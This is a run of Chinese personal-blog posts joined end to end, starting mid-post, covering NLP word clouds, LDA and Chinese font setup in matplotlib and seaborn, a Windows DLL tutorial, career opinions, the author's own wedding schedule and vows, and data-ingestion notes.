当然这个是一个讨巧的方案，因为目前来看word2vector 要自己用语料来训练，假如我们要针对行业 的语料来进行训练，应该怎么搞呢？
gensim 训练词向量
工业级开源组件，强烈推荐
部分开源词向量

1.Chinese Word Vectors：目前最全的中文预训练词向量集合
https://www.jiqizhixin.com/articles/2018-05-15-10
https://github.com/Embedding/Chinese-Word-Vectors
2.Tencent AI Lab Embedding Corpus for Chinese Words and Phrases
https://ai.tencent.com/ailab/nlp/embedding.html
3.Pre-trained word vectors
We distribute pre-trained word vectors for 157 languages, trained on Common Crawl and Wikipedia using fastText. These models were trained using CBOW with position-weights, in dimension 300, with character n-grams of length 5, a window of size 5 and 10 negatives. We also distribute three new word analogy datasets, for French, Hindi and Polish.
https://github.com/facebookresearch/fastText/blob/master/docs/crawl-vectors.md


未完待续
NLP系列文章:

自然语言处理简介（1）---- 服务梳理与传统汉语分词
深度学习与中文短文本分析总结与梳理
错误使用tf-idf的实例分享
知识图谱技术分享会----有关知识图谱构建的部分关键技术简介及思考
基于分布式的短文本命题实体识别之----人名识别（python实现）
简单NLP分析套路（1）----语料库积累之3种简单爬虫应对大部分网站
简单NLP分析套路（2）----分词，词频，命名实体识别与关键词抽取
简单NLP分析套路（3）---- 可视化展现与语料收集整理










                  					
														



文章大纲NLP 可视化wordCloudLDA 主题模型matplotlib seaborn 绘图加载中文字体行业语料库保险行业语料库医学健康类语料库NLP系列文章

构思这个系列的初衷是很明显的，之前我是从图论起家搞起了计算机视觉，后来发现深度学习下的计算机视觉没的搞了，后来正好单位的语料很丰富就尝试了NLP 的一些东西，早期非常痴迷于分词等等的技术，后来发现NLP 里面是有广阔天地的。
如果你现在打开微信，可能很多公众号都在推送从哪里爬取了一些语料数据如下图，


原文链接：透过评论看Runningman
比如豆瓣电影的评论，对某某最新上映的电影做了如下一些分析，看起来花花绿绿很是高端，当然我们也能做，而且要做的更高端一些!!!

NLP 可视化
NLP 可视化有多种实现方案，包括我们熟知的词云就非常直观。当然还有主题模型，句子依存分析，知识图谱等等展现手段
wordCloud
# encoding: utf-8
'''
@author: season
@contact: shiter@live.cn

@file: wordCloud.py
@time: 2018/11/6 22:38
@desc:
'''


import matplotlib.pyplot as plt
from wordcloud import WordCloud
import jieba
import jieba.analyse
import pandas

import os


def file_name(file_dir,extension):
    L = []
    for root, dirs, files in os.walk(file_dir):
        for file in files:
            if os.path.splitext(file)[1] == extension:
                L.append(os.path.join(root, file))
    return L

file_list = file_name('blog/','.txt')

print(file_list)

def get_all_strFromTxt(file_name):
    str_blog = ''
    with open(file_name,'r',encoding='utf-8') as f:
        str_blog = f.read()
    return str_blog


# file_path = u'''0.csv'''
# col_names = ["index","1","2"]
# data = pandas.read_csv(file_path, names=col_names, header = 0,engine='python', dtype=str,encoding='utf-8')
# # 返回前n行
# # 返回前n行
# first_rows = data.head(n=2)
# print(first_rows)
#
# data.info()
#
#
#

top_word_dict = {}

def getTopkeyWordsTFIDF(stop_word_file_path,topK=100,content = ''):
    try:
        jieba.analyse.set_stop_words(stop_word_file_path)
        tags = jieba.analyse.extract_tags(content, topK, withWeight=True,allowPOS=('ns', 'n', 'vn', 'v'))
        for v, n in tags:
            print (v + '\t' + str((n )))
            top_word_dict[v] = n*100
    except Exception as e:
        print(e)
    finally:
        pass

def getTopkeyWordsTextRank(stop_word_file_path,topK=100,content = ''):
    try:
        jieba.analyse.set_stop_words(stop_word_file_path)
        tags = jieba.analyse.textrank(content, topK, withWeight=True)
        for v, n in tags:
            print (v + '\t' + str(int(n )))
    except Exception as e:
        print(e)
    finally:
        pass

str_summary = ''
#
# for i in range(0, len(data)):
#     #print(data.iloc[i]['line_remark'])
#     str_summary = str_summary+data.iloc[i]['line_remark']
#

for i in file_list:
    str_summary = str_summary + get_all_strFromTxt(i)

text_from_file_with_apath = str_summary


getTopkeyWordsTFIDF('stop_words.txt',150,text_from_file_with_apath)


stop_words = [' ','挂号']

# 可以指定字体，或者按照词频生成
def show_WordCloud(str_all):
    wordlist_after_jieba = jieba.cut(str_all, cut_all=True)
    wl_space_split = " ".join(wordlist_after_jieba)
    my_wordcloud = WordCloud(background_color = "white",width = 1000,height = 860,font_path = "msyh.ttc",
                # 不加这一句显示口字形乱码
                margin = 2,
    max_words=150, # 设置最大现实的字数
    stopwords=stop_words,# 设置停用词
    max_font_size=250,# 设置字体最大值
    random_state=50# 设置有多少种随机生成状态，即有多少种配色方案

    )
    #my_wordcloud = my_wordcloud.generate(wl_space_split)
    my_wordcloud = my_wordcloud.generate_from_frequencies(top_word_dict)

    plt.imshow(my_wordcloud)
    plt.axis("off")
    plt.show()

show_WordCloud(text_from_file_with_apath)



算法	0.08393536068790623
图像	0.06798005803851344
数据	0.05240655130424626
文档	0.05059459998147416
博主	0.05050301638484851
使用	0.04356879903615233
函数	0.042060415733978916
查询	0.04005136456931241
匹配	0.037386342706479996
代码	0.03603846563455227
方法	0.034559914773027035
节点	0.033931860083514016
特征	0.03291738415318488
进行	0.031490540413372146
排序	0.029646884115013712
计算	0.029533756683699914
需要	0.029447451266380476
线程	0.02876913122420475
像素	0.028464105792597654
模型	0.027687724999548125
文件	0.027195920887218235
字段	0.026565494216139303
结果	0.025830152697758277
视差	0.024437895533599558
信息	0.02390653201451686
分片	0.02315742689824399
文章	0.02157718425850839
处理	0.02109550803266701
学习	0.021005721546578465
定义	0.02056261379145052
实现	0.02039579088457056
参数	0.02036164789518406
问题	0.020284272744458855
用户	0.019859257580053805
返回	0.019832118152486682
分词	0.019801132262955684
创建	0.019597880527283076
系统	0.019390564734465893
版权	0.018984989081581773
时候	0.018884022674800702
转载	0.01866584359633088
检测	0.018436606839486752
包含	0.017926737352527033
矩阵	0.017271551959541505
安装	0.0171156281612187
数据库	0.016960979586574783

LDA 主题模型
LDA 据说非常复杂，我看了半天好像也没有太懂
不过有代码可以跑，这一点是很好的。 用我的所有博客跑出来的5个主题如下:
Topic #0:
我们 自己 如果 时候 就是 没有 数据 问题 进行 排序 选择 需要 函数 什么 学习 x2 工作 知道 这样 时间
Topic #1:
const char value doc xml node element file error bool void text str project true print code size buf false
Topic #2:
cv image include mat width size img height double lib void data opencv 图像 null std char src float max
Topic #3:
算法 数据 使用 特征 进行 方法 匹配 模型 www 文档 查询 图像 需要 信息 通过 系统 结果 所有 基于 com
Topic #4:
string self left cout include right def array result root push vector class endl void null sum size char end


具体代码详见：https://wynshiter.github.io/NLP_DEMO/

matplotlib seaborn 绘图加载中文字体
效果图：

matplotlit可以采用设置字体的办法
%load_ext autoreload
%autoreload 2
%matplotlib inline

# ...
# -*- coding: utf-8 -*-
import matplotlib.pyplot as plt
from matplotlib.font_manager import FontProperties

font = FontProperties(fname=r"msyh.ttc", size=14)  

plt.bar([1, 3, 5, 7, 9], [5, 4, 8, 12, 7], label='graph 1')

plt.bar([2, 4, 6, 8, 10], [4, 6, 8, 13, 15], label='graph 2')

# params

# x: 条形图x轴
# y：条形图的高度
# width：条形图的宽度 默认是0.8
# bottom：条形底部的y坐标值 默认是0
# align：center / edge 条形图是否以x轴坐标为中心点或者是以x轴坐标为边缘

plt.legend()

plt.xlabel(u'中文',FontProperties=font)
plt.ylabel('value')

plt.title(u'测试例子——条形图', FontProperties=font)

plt.show()

seaborn就麻烦一点，先把matplotlib调试好，才有修改配置文件，并下载相关字体的办法进行配置
参考链接：
https://www.zhihu.com/question/25404709/answer/309784195

#首先运行下面两行
from matplotlib.font_manager import _rebuild
_rebuild() 
###########
import matplotlib.pyplot as plt
import seaborn as sns
hospitalization_pdf = hospitalization_df.toPandas()

sns.set_style('whitegrid',{'font.sans-serif':['SimHei','Arial']})
sns.set_context("talk")

%matplotlib inline


sns.boxplot( y='年龄', data=hospitalization_pdf, palette="Set3")
plt.show()


行业语料库
保险行业语料库
https://github.com/Samurais/insuranceqa-corpus-zh/wiki
医学健康类语料库
中国疾病知识图谱
http://med.ckcest.cn/knowledgeGraph.jsp
疾病科学数据库：
http://med.ckcest.cn/resource/scientificData.html
中国医院大全：
http://yyk.qqyy.com/search.html
99医院库（医疗评分）：
https://yyk.99.com.cn/
药物临床试验登记与信息公示平台
http://www.chinadrugtrials.org.cn/eap/clinicaltrials.prosearch

NLP系列文章

深度学习与中文短文本分析总结与梳理
错误使用tf-idf的实例分享
知识图谱技术分享会----有关知识图谱构建的部分关键技术简介及思考
基于分布式的短文本命题实体识别之----人名识别（python实现）
简单NLP分析套路（1）----语料库积累之3种简单爬虫应对大部分网站
简单NLP分析套路（2）----分词，词频，命名实体识别与关键词抽取
简单NLP分析套路（3）---- 可视化展现与语料收集整理












文章大纲NLP 可视化wordCloudLDA 主题模型matplotlib seaborn 绘图加载中文字体CentOS 安装中文字体查看matplotlib 字体目录查看系统可用的中英文字体matplotlib  设置中文字体seaborn设置中文字体其他解决 matplotlib 中文显示的思路NLP系列文章

构思这个系列的初衷是很明显的，之前我是从图论起家搞起了计算机视觉，后来发现深度学习下的计算机视觉没的搞了，后来正好单位的语料很丰富就尝试了NLP 的一些东西，早期非常痴迷于分词等等的技术，后来发现NLP 里面是有广阔天地的。
如果你现在打开微信，可能很多公众号都在推送从哪里爬取了一些语料数据如下图，


原文链接：透过评论看Runningman
比如豆瓣电影的评论，对某某最新上映的电影做了如下一些分析，看起来花花绿绿很是高端，当然我们也能做，而且要做的更高端一些!!!

NLP 可视化
NLP 可视化有多种实现方案，包括我们熟知的词云就非常直观。当然还有主题模型，句子依存分析，知识图谱等等展现手段,下面我们分别就一些经典可视化手段进行介绍。
wordCloud
# encoding: utf-8
'''
@author: season
@contact: shiter@live.cn

@file: wordCloud.py
@time: 2018/11/6 22:38
@desc:
'''


import matplotlib.pyplot as plt
from wordcloud import WordCloud
import jieba
import jieba.analyse
import pandas

import os


def file_name(file_dir,extension):
    L = []
    for root, dirs, files in os.walk(file_dir):
        for file in files:
            if os.path.splitext(file)[1] == extension:
                L.append(os.path.join(root, file))
    return L

file_list = file_name('blog/','.txt')

print(file_list)

def get_all_strFromTxt(file_name):
    str_blog = ''
    with open(file_name,'r',encoding='utf-8') as f:
        str_blog = f.read()
    return str_blog


# file_path = u'''0.csv'''
# col_names = ["index","1","2"]
# data = pandas.read_csv(file_path, names=col_names, header = 0,engine='python', dtype=str,encoding='utf-8')
# # 返回前n行
# # 返回前n行
# first_rows = data.head(n=2)
# print(first_rows)
#
# data.info()
#
#
#

top_word_dict = {}

def getTopkeyWordsTFIDF(stop_word_file_path,topK=100,content = ''):
    try:
        jieba.analyse.set_stop_words(stop_word_file_path)
        tags = jieba.analyse.extract_tags(content, topK, withWeight=True,allowPOS=('ns', 'n', 'vn', 'v'))
        for v, n in tags:
            print (v + '\t' + str((n )))
            top_word_dict[v] = n*100
    except Exception as e:
        print(e)
    finally:
        pass

def getTopkeyWordsTextRank(stop_word_file_path,topK=100,content = ''):
    try:
        jieba.analyse.set_stop_words(stop_word_file_path)
        tags = jieba.analyse.textrank(content, topK, withWeight=True)
        for v, n in tags:
            print (v + '\t' + str(int(n )))
    except Exception as e:
        print(e)
    finally:
        pass

str_summary = ''
#
# for i in range(0, len(data)):
#     #print(data.iloc[i]['line_remark'])
#     str_summary = str_summary+data.iloc[i]['line_remark']
#

for i in file_list:
    str_summary = str_summary + get_all_strFromTxt(i)

text_from_file_with_apath = str_summary


getTopkeyWordsTFIDF('stop_words.txt',150,text_from_file_with_apath)


stop_words = [' ','挂号']

# 可以指定字体，或者按照词频生成
def show_WordCloud(str_all):
    wordlist_after_jieba = jieba.cut(str_all, cut_all=True)
    wl_space_split = " ".join(wordlist_after_jieba)
    my_wordcloud = WordCloud(background_color = "white",width = 1000,height = 860,font_path = "msyh.ttc",
                # 不加这一句显示口字形乱码
                margin = 2,
    max_words=150, # 设置最大现实的字数
    stopwords=stop_words,# 设置停用词
    max_font_size=250,# 设置字体最大值
    random_state=50# 设置有多少种随机生成状态，即有多少种配色方案

    )
    #my_wordcloud = my_wordcloud.generate(wl_space_split)
    my_wordcloud = my_wordcloud.generate_from_frequencies(top_word_dict)

    plt.imshow(my_wordcloud)
    plt.axis("off")
    plt.show()

show_WordCloud(text_from_file_with_apath)


词云结果：(值得一提的是我们可以分别用TFIDF  或者TEXTRANK 算法提取关键词)

本人博客关键词 TF-IDF
算法	0.08393536068790623
图像	0.06798005803851344
数据	0.05240655130424626
文档	0.05059459998147416
博主	0.05050301638484851
使用	0.04356879903615233
函数	0.042060415733978916
查询	0.04005136456931241
匹配	0.037386342706479996
代码	0.03603846563455227
方法	0.034559914773027035
节点	0.033931860083514016
特征	0.03291738415318488
进行	0.031490540413372146
排序	0.029646884115013712
计算	0.029533756683699914
需要	0.029447451266380476
线程	0.02876913122420475
像素	0.028464105792597654
模型	0.027687724999548125
文件	0.027195920887218235
字段	0.026565494216139303
结果	0.025830152697758277
视差	0.024437895533599558
信息	0.02390653201451686
分片	0.02315742689824399
文章	0.02157718425850839
处理	0.02109550803266701
学习	0.021005721546578465
定义	0.02056261379145052
实现	0.02039579088457056
参数	0.02036164789518406
问题	0.020284272744458855
用户	0.019859257580053805
返回	0.019832118152486682
分词	0.019801132262955684
创建	0.019597880527283076
系统	0.019390564734465893
版权	0.018984989081581773
时候	0.018884022674800702
转载	0.01866584359633088
检测	0.018436606839486752
包含	0.017926737352527033
矩阵	0.017271551959541505
安装	0.0171156281612187
数据库	0.016960979586574783

LDA 主题模型
LDA 据说非常复杂，我看了半天好像也没有太懂
不过有代码可以跑，这一点是很好的。 用我的所有博客跑出来的5个主题如下:
Topic #0:
我们 自己 如果 时候 就是 没有 数据 问题 进行 排序 选择 需要 函数 什么 学习 x2 工作 知道 这样 时间
Topic #1:
const char value doc xml node element file error bool void text str project true print code size buf false
Topic #2:
cv image include mat width size img height double lib void data opencv 图像 null std char src float max
Topic #3:
算法 数据 使用 特征 进行 方法 匹配 模型 www 文档 查询 图像 需要 信息 通过 系统 结果 所有 基于 com
Topic #4:
string self left cout include right def array result root push vector class endl void null sum size char end


具体代码详见：NLP 学习仓库

matplotlib seaborn 绘图加载中文字体
如果系统，及matplotlib 本身有中文字体
可以在代码中使用
import matplotlib.pyplot as plt
plt.rcParams['font.sans-serif']=['Microsoft YaHei'] 

如果没有，那么windows 系统需要下载字体，linux 系统需要安装字体。
CentOS 安装中文字体
下载ttf 格式字体，如 黑体, msyh.ttf
使用如下脚本安装：
cd /usr/share/fonts/yourfontsdir
#生成字体索引信息. 会显示字体的font-family
sudo mkfontscale
sudo mkfontdir
#更新字体缓存：
fc-cache

查看matplotlib 字体目录
import matplotlib
matplotlib.matplotlib_fname()

输出：
'/home/hadoop/anaconda/envs/playground_py36/lib/python3.6/site-packages/matplotlib/mpl-data/matplotlibrc'

查看系统可用的中英文字体

centos linux 下查看中文字体

fc-list  :lang=zh


输出
Microsoft YaHei,微软雅黑:style=Regular,Normal,obyčejné,Standard,Κανονικά,Normaali,Normál,Normale,Standaard,Normalny,Обычный,Normálne,Navadno,Arrunta
Microsoft YaHei UI:style=Regular,Normal,obyčejné,Standard,Κανονικά,Normaali,Normál,Normale,Standaard,Normalny,Обычный,Normálne,Navadno,Arrunta




matplotlib 可用字体

from matplotlib.font_manager import FontManager
import subprocess
 
mpl_fonts = set(f.name for f in FontManager().ttflist)
 
print ('all font list get from matplotlib.font_manager:')
for f in sorted(mpl_fonts):
    print('\t' + f)
    
# 仅在Linux下能够正常运行
output = subprocess.check_output('fc-list :lang=zh -f "%{family}\n"', shell=True, encoding="utf8")
 
zh_fonts = set(f.split(',',1)[0] for f in output.split('\n'))
 
print('\n' +'Chinese font list get from fc-list:')
for f in sorted(zh_fonts):
    print('\t' + f)
 
print('\n' +'the fonts we can use:')
available = set(mpl_fonts) & set(zh_fonts)
for f in available:
    print('\t' + f)

输出：
all font list get from matplotlib.font_manager:
	DejaVu Sans
	DejaVu Sans Display
	DejaVu Sans Mono
	DejaVu Serif
	DejaVu Serif Display
	Microsoft YaHei
	STIXGeneral
	STIXNonUnicode
	STIXSizeFiveSym
	STIXSizeFourSym
	STIXSizeOneSym
	STIXSizeThreeSym
	STIXSizeTwoSym
	cmb10
	cmex10
	cmmi10
	cmr10
	cmss10
	cmsy10
	cmtt10

Chinese font list get from fc-list:
	
	Microsoft YaHei
	Microsoft YaHei UI

the fonts we can use:
	Microsoft YaHei

matplotlib  设置中文字体
效果图：

matplotlit可以采用设置字体的办法
%load_ext autoreload
%autoreload 2
%matplotlib inline

# ...
# -*- coding: utf-8 -*-
import matplotlib.pyplot as plt
from matplotlib.font_manager import FontProperties

font = FontProperties(fname=r"msyh.ttc", size=14)  

plt.bar([1, 3, 5, 7, 9], [5, 4, 8, 12, 7], label='graph 1')

plt.bar([2, 4, 6, 8, 10], [4, 6, 8, 13, 15], label='graph 2')

# params

# x: 条形图x轴
# y：条形图的高度
# width：条形图的宽度 默认是0.8
# bottom：条形底部的y坐标值 默认是0
# align：center / edge 条形图是否以x轴坐标为中心点或者是以x轴坐标为边缘

plt.legend()

plt.xlabel(u'中文',FontProperties=font)
plt.ylabel('value')

plt.title(u'测试例子——条形图', FontProperties=font)

plt.show()

seaborn设置中文字体
（以 matplotlib 为基础的库的可视化库的中文显示问题，都可以这么设置）
seaborn就麻烦一点，先把matplotlib调试好，才有修改配置文件，并下载相关字体的办法进行配置
配置方法：


1.下载字体SimHei，放在matplotlib文件夹中



2.修改配置文件，在matplotlib/mpl-data/目录下面matplotlibrc ，修改下面三项配置
font.family  : sans-serif
font.sans-serif   : SimHei, Bitstream Vera Sans, Lucida Grande, Verdana, Geneva, Lucid, Arial, Helvetica, Avant Garde, sans-serif
axes.unicode_minus:False，#作用就是解决负号’-'显示为方块的问题


3.命令行重新载入字体


from matplotlib.font_manager import _rebuild

_rebuild() #reload一下

上述内容 参考链接：
https://www.zhihu.com/question/25404709/answer/309784195
那么设置完成matplotlib 后，seaborn 等依赖库，只要配置好如下对应代码即可
#首先运行下面两行
import pandas as pd
from matplotlib.font_manager import _rebuild
_rebuild() 
########### 测试代码
import matplotlib.pyplot as plt
import seaborn as sns



data = {
        '性别':['男','女','女','男','男'],
        '姓名':['小明','小红','小芳','大黑','张三'],
        '年龄':[20,21,25,24,29]}

test_pdf = pd.DataFrame(data,index=['one','two','three','four','five'],
               columns=['姓名','性别','年龄','职业'])




sns.set_style('whitegrid',{'font.sans-serif':['SimHei','Arial']})
sns.set_context("talk")

%matplotlib inline


sns.boxplot( y='年龄', data=test_pdf, palette="Set3")
plt.show()

其实核心就是这一句：设置字体
sns.set_style('whitegrid',{'font.sans-serif':['SimHei','Arial']})

效果：

参考：  天池整体可视化教程
其他解决 matplotlib 中文显示的思路
安装包：
#安装开源库pyplotz

pip install pyplotz



from pyplotz.pyplotz import PyplotZ
from pyplotz.pyplotz import plt
pltz=PyplotZ()
pltz.enable_chinese()

上述方案和这个方案都有一个最大的问题，就是pandas直接调用的时候还是出问题，现在还没有找到参数传递的口子。 猜想在pandas 中还有配置文件的目录，这个目录的配置文件优先级高于matplotlib的自带配置文件，有待进一步验证。

NLP系列文章

深度学习与中文短文本分析总结与梳理
错误使用tf-idf的实例分享
知识图谱技术分享会----有关知识图谱构建的部分关键技术简介及思考
基于分布式的短文本命题实体识别之----人名识别（python实现）
简单NLP分析套路（1）----语料库积累之3种简单爬虫应对大部分网站
简单NLP分析套路（2）----分词，词频，命名实体识别与关键词抽取
简单NLP分析套路（3）---- 可视化展现初步









首先,我们知道VC的三种Dll分别是
1.non_MFC Dll
2.MFC Regular Dll
3.MFC Extension Dll
 
平时我们使用在代码中的:
#pragma comment(lib,"Test_of_dll.lib")

的意思是指文中生成的obj文件应该与Test_of_dll.lib一起链接.或者可以在VC的工程中设置加载此lib
 
下面,来做一个简单动态Dll
新建一个Win32 Application,application setting中勾选Dll,完成.添加如下文件后,编译链接.
 
lib.h文件如下:
#ifndef LIB_H
#define LIB_H
extern "C" int __declspec(dllexport)add(int x,int y);
#endif

lib.cpp文件如下:
#include"stdafx.h"
#include"lib.h"

int add(int x,int y)
{
	return x + y;
}

之后另外新建一个工程,调用此工程生成的Dll,Test_of_nonMFCdll.dll
代码如下:
// Test_of_dllCall.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include"stdio.h"
#include"windows.h"

typedef int(*lpAddFun)(int, int);	//宏定义函数指针类型


int _tmain(int argc, _TCHAR* argv[])
{
	HINSTANCE hDll;		//Dll句柄
	lpAddFun addFun;	//函数指针
	hDll=LoadLibrary("..\\..\\Debug\\Test_of_nonMFCdll.dll");

	if(NULL!=hDll)
	{
		addFun=(lpAddFun)GetProcAddress(hDll,"add");

		if(NULL!=addFun)
		{
			int  result = addFun(2, 3);
			printf("The result of addFun is %d \n",result);
			getchar();
		}


		FreeLibrary(hDll);
	}
	return 0;
}



注意其中的路径,要根据Dll所在做变化,不然找不到相应的Dll:
hDll=LoadLibrary("..\\..\\Debug\\Test_of_nonMFCdll.dll");


调用后的结果:
The result of addFun is 5

 
 
 









以下观点不保证客观，仅一家之言，如存在异议，诠做笑谈。
1. 时间成本
算法工程师通常要求硕士学历，而攻读硕士的三年时间就成为了成本。互联网圈有一万小时理论，任何技术要精通，需三年的积累。如果本科毕业之后从事一个岗位三年，那么三年后已经成为行业专家了，而有些人才硕士毕业。
2. 机会成本
算法工程师的职位大多集中在一线互联网公司，创业型公司在完成一定的融资后，当产品成熟的时候才需要算法工程师，因此能提供的工作机会相比普通开发要少很多。通常一个企业没有算法工程师可以继续生存，但是没有基础开发工程师那就无法存活。而且企业里面对于基础开发工程师的需求量远大于算法工程师，二者的比率大约是十比一。
3. 生活成本
需要算法工程师的企业大多集中在一线城市，而一线城市的物价水平对于普通上班族几乎无法承受。因此，就存在这样一批人，年轻的时候在一线城市打工，等到有孩子之后，就逐渐回退到家乡城市或二线城市发展，这样的变动对于个人的影响是十分巨大的。
4. 可扩展性
算法岗位分类繁杂，NLP、图像、推荐等等，每个算法人都需要结合具体的产品方向，在一家公司某个方向上进行积累，而这些积累想要移植到其他邻域几乎是不可能的，常常需要重新开始。但普通开发则不同，在一个单位的积累都是一行一行的写出来的，一个项目一个项目的做，那都是实打实的积累，并不会因为单位业务的变化而产生大的影响。算法工程师仅仅是换一个项目组都是极大的挑战，如同换了一家公司。但这个论点的前提是普通开发不能沉迷于具体的业务而无法自拔，因此持续的学习能力就十分重要。
5. 人生更大的可能
相比普通开发，算法工程师机会更少，因此如果你喜欢折腾或者心存大志，那么普通开发将能够提供更多的可能。我们说成功是无数次的失败换取的成功，如果没有大量的机会去失败，那么成功的几率就会非常小。或许闲暇时间自己做一个网站或者app，就能很容易的上线让用户去使用，如果用户量多，那么可以独立做公司从中牟利或者树立行业威望，而做算法就只能推导数学公式，写写算法代码，就连获取模型训练数据都是一件极为困难的事情，就更谈不上从中获利了。
6. 收益率
在刚开始的几年大家都是普通上班族，从薪水上讲算法工程师略高一些，但人生要想实现财务自由，做上班族几乎是很难实现的，除非你是开复老师。要想实现跨越财务的门槛，期权、股权等是不可或缺的。一家初创公司Java开发工程师或许是前10号员工，算法工程师只能到100号左右，二者在公司能够获得的地位和收益就会存在巨大的差别。
7. 媒体的噱头
一个产品成功与否主要在于用户的需求。现今中国人的需求是什么？看看近年大火的行业和公司就知道，美团、饿了么、滴滴、ofo、摩拜。哪家公司的产品核心是算法，简简单单的送快餐、投放自行车、打车就能完爆中国，还谈什么人工智能，大家还是洗洗睡吧！而大呼人工智能的公司以算法为核心的产品哪一家成功实现落地了，至今没有。创新工场谈人工智能，它们就是个孵化器，项目能不能存活都是未知；百度大谈无人驾驶，谷歌搞了十来年都没量产，它还是放放医疗广告来的实在；天猫精灵、小米小i、苹果Siri、微软小娜和小冰，真是谁用谁知道，能够摆脱人工智障都算不错了。媒体谈这些需要吸引大众眼球；创业者谈这些需要问投资人要钱；企业谈这些要提升逼格拉升股价。
8. 深度学习
它当然是很牛的，效果提升也是显著的，但是它的出现只是促使人们在追求人工智能的道路上更前进了一步，但它并不等于人工智能。
各位，洗洗睡吧！

p.s.
 









今年上半年 的任务就是准备婚礼，所以博客论坛基本上都没有什么更新。
这让我想起来，每年一届的csdn 博客之星评选，印象中很多届前几名鸿洋什么的头像都是自己的婚纱照。他们结了婚还能坚持写博客，我很是敬佩。
微信邀请函链接：链接
https://www.hunliji.com/p/wedding/Home/Pay/card_page?card_id=MTM1Mzc0MTVmaXJlX2Nsb3Vk&appName=weddingUser&with_myb=1&from=singlemessage
婚礼纪这个还挺好玩的


将近一个月前，智宇，嘉伟和我就开车顺着路线跑了一圈，全程30 km/h, 最后结婚的时候还是有很多突发状况，导致敬酒迎宾的时候时间不够。非常感谢朋友们，尤其是结了婚的几个初中同学帮我考虑了很多，包括时间表，给司机们制作了地图。


7: 00 -7：20 在新郎家集合，城西客运站枣园东路二号精密社区集合，车停院子
7: 20-7:50  从城西客运站精密社区出发（枣园东路，直行到三桥立交，进入建章路，直行到高堡子村，媳妇小区，全程8公里约25分钟）
8：00 到达新娘家  建章路高堡子村子，跟着头车摄像车进村子（路窄小心剐蹭）
8：30 从新娘家出发（途径高堡子门楼，建章路，三桥，上三环，南三环，行至东仪路左拐，上丈八路，右拐朱雀大街，前行即到，共约20公里，行程约1小时20分钟）
10：00 到达新家 朱雀大街紫郡长安北区（停车可停《城市立方》停车场，汇成天玺酒店）
10：30 -10：45 新家出发到达 汇成天玺酒店
11：00 -11：30 新娘新郎 换衣服准备迎宾


誓词我想了挺久的，我和张老师认识很久，但是真正表白的时候说点什么好呢？挺头疼的，哈哈
当然得真情流露啊：
誓词
	亲爱的，花花，我们相识已经四年有余，一路走来的1620多个日日夜夜里充满了喜怒哀乐。
	喜的是我们在一起的每时每刻都充满欢乐。 
	怒的是我们也会偶尔争吵，但只要将你揽入怀里火气就消了一半。
	哀的是，之前工作总是出差，聚少离多，索性，我辞职回来，有幸加入了现在的公司，知盛数据。 
	乐的是，遇见你，良辰美景便有了更多的意义。

	此时此刻在这里，在所有亲朋好友的见证下，请让我再一次郑重的向你表白，我爱你，花花。


婚礼仪式上当然需要欢迎大家了，千言万语汇成一句话就是感谢，全方位的感谢，下面是我参考网上的例子一晚上想出来的，哈哈。
欢迎词
女士们、先生们，亲人们，朋友们：
大家好！
　　今天的我们，站在绚丽的婚礼舞台上，身边有亲密爱人相伴，眼中有大家亲切的笑容，耳中是大家真挚的祝福，心里无比地激动，干言万语只能汇成两个字，那就是“感谢”。
　
　　我要首先感谢我们的父母们，是你们含辛茹苦，无私宽容的爱才能让我们拥有今天的幸福生活。花花，让我们为爸爸妈妈们鞠上一躬。
我还要感谢我们的领导，同事，感谢你们长期以来对我们的关心和支持，使我们一步一步走向成熟。特别感谢十所的伙计们前来捧场，我们曾是一个战壕的兄弟。感谢知盛数据的伙伴们，为了IPO为了财富自由，等我结完婚度完蜜月马上回去好好干。感谢阿房路三校的的老师们，我也是陕师大毕业，算半个同行，向人类灵魂的工程师致敬。
我最后要感谢我们的亲朋好友，感谢你们的亲情、友情，感谢你们的鼓励和帮助，我还想要特别感谢横跨千山万水来见证我们婚礼的几位小伙伴，有你们相伴，我们对未来充满信心。
最后，让我和花花一起再次感谢大家的到来，谢谢大家，鞠躬。


度蜜月
这个事情说起来还有点糟心，由于之前有保密协议不能出国，我俩脑子一热去了云南。结果就坨坨的被黑导游坑了，不过整体来看，云南的天气和水果都是不错的。最惊艳的地方就是玉龙雪山和泸沽湖了




婚后的生活








 
注册之后，可以跟着指导，自己编码学习，比较方面：
 
 

 
 
再推荐一个在线编译的代码网站，c/c++ python  都可以：
 
http://codepad.org
 
 

 
 
 









文章大纲统一数据接入大数据接入处理面临的问题数据接入的三个阶段前中后接入技术分析批处理流式1.数据接入手段2.接入技术选择参考文献

统一数据接入
数据接入就是对于不同的数据来源、不同的合作伙伴，完成数据采集、数据传输、数据处理、数据缓存到行业统一的数据平台的过程。

大数据接入处理面临的问题


数据接入的三个阶段

前
0.非结构化数据----（word，excel，图片，pdf，扫描件，视频）
1.文本文件----(txt，csv)----utf-8
（踩过的坑-gbk编码和数据中换行符触发spark2.2  加载文件的bug（multiline 和gbk 不能共同作用））
2.数据库（full dump，请求接口）
3.去ioe，集群迁徙
数据格式，字段，内容要求：
非结构化数据
0. 标签，背景模板，文档说明
结构化数据
数据字典，ER图，数据流图，系统截图，新人入职培训说明
1.所有文本文件要求编码格式utf8，csv 要求双引号包裹（字段中不要有回车换行）
2.数据库full dump 给出导出脚本及日志（yiyong数据的坑----没有导出脚本，看着报错一步步推断）
3.请求接口给出请求文档，及支持的最大并发数等指标
中
针对不同的数据来源，确定数据最终存储的格式，地点
后
1.数据质量核查
2.描述性统计分析

接入技术分析

批处理
优点：数据覆盖面广，时间跨度长，支撑业务范围广 ，计算准确度高；依靠历史数据预先计算相关数据模型
缺点：数据实效性不足 存储空间、存储类型需求大
流式
优点：高效查询、快速响应、“热数据”价值高效利用
缺点：上下文关联密切场景业务支撑不足
1.数据接入手段
1）socket方式
c/s交互模式，传输协议采用tcp/udp
优点：1.易于编程，java提供了多种框架，屏蔽了底层通信细节以及数据传输转换细节。2.容易控制权限。通过传输层协议https，加密传输的数据，使得安全性提高
3.通用性比较强，无论客户端是.net架构，java，python 都是可以的。尤其是webservice规范，使得服务变得通用
缺点：1.服务器和客户端必须同时工作，当服务器端不可用的时候，整个数据交互是不可进行。2 当传输数据量比较大的时候，严重占用网络带宽，可能导致连接超时。使得在数据量交互的时候，服务变的很不可靠
2）ftp/文件共享服务器方式
适合大数据量的交互，约定文件格式、命名规则。批量处理数据
优点：
在数据量大的情况下，可以通过文件传输，不会超时，不占用网络带宽
方案简单，易操作
缺点：
实时性不强
必须约定文件数据的格式，当改变文件格式的时候，需要各个系统都同步做修改
3）message形式
Java消息服务（Java Message Service）是message数据传输的典型的实现方式。
